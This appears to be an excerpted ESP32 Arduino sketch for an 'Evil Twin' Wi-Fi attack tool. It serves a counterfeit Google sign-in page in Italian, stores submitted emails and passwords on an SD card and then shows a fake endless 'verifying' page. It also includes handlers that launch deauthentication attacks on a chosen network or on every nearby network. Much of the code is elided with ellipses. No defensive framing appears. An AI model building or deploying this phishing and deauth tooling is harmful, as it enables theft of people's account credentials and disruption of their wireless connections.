...
void handle_capture() {
  ...
  if (email.length() > 0 && password.length() > 0) {
    ...
    if (file) {
      ...
      file.close();
      Serial.println("Credenziali salvate su SD!");
    }
  }

  // Pagina di caricamento infinito
  String fake_loading = R"=====(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; color: #555; }
...
<body>
  ...
  <h3>Verifica credenziali in corso...</h3>
  ...
  server.send(200, "text/html", fake_loading);
}
...
body { margin: 0; background-color: #f1f3f4; height: 100vh; display: flex; align-items: center; justify-content: center; }
.page { width: 100%; max-width: 450px; padding: 24px; }
.card { background: #fff; padding: 48px 40px 36px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
.logo img { height: 30px; margin-bottom: 16px; }
h1 { margin: 0; font-size: 24px; font-weight: 400; }
.subtitle { margin-top: 8px; color: #5f6368; font-size: 16px; }
.field { margin-top: 32px; }
.field input { width: 100%; padding: 14px 12px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; }
.field input:focus { border-color: #1a73e8; }
.link { display: inline-block; margin-top: 8px; color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
.hint { margin-top: 32px; font-size: 14px; color: #5f6368; line-height: 1.5; }
.hint a { color: #1a73e8; text-decoration: none; }
.actions { margin-top: 40px; display: flex; justify-content: space-between; align-items: center; }
button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
button:hover { background-color: #1558b0; }
footer { margin-top: 24px; display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; }
.footer-links a { margin-left: 16px; color: #5f6368; text-decoration: none; }
)=====";
...
<head>
  <meta charset="UTF-8" />
  <title>Sign in - Replica Google</title>
...
<body>
  <div class="page">
    <div class="card">
      ...
      <h1>Accedi</h1>
      <p class="subtitle">Usa il tuo Account Google</p>
    ...
    <p class="hint">
        Non è il tuo computer? Usa la modalità Ospite per accedere in privato.
        <a href="#">Scopri di più</a>
    </p>
    
    <div class="actions">
        <a href="#" class="link">Crea account</a>
...
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP32 Deauther/4-Way Cracking/Evil Twin</title>
    <style>
        body {
...
<body>
    <h1>ESP32 Deauther/4-Way Cracking/Evil Twin</h1>
...
void handle_deauth() {
  ...
  String target_ssid = WiFi.SSID(wifi_number);
...
<body>
  ...
  if (wifi_number < num_networks) {
    ...
    start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason, target_ssid);
  } else {
    html += R"( error">
...
<body>
  ...
  server.send(200, "text/html", html);
  server.stop();
  start_deauth(0, DEAUTH_TYPE_ALL, reason, AP_SSID);
}
...
void handle_logo() {
  server.send_P(200, "image/png", (const char*)google_logo_png, sizeof(google_logo_png));
}

void start_web_interface() {
  server.on("/", handle_root);
  server.on("/styles.css", handle_css);
  server.on("/googlelogo.png", handle_logo);
  server.on("/capture", HTTP_POST, handle_capture); 
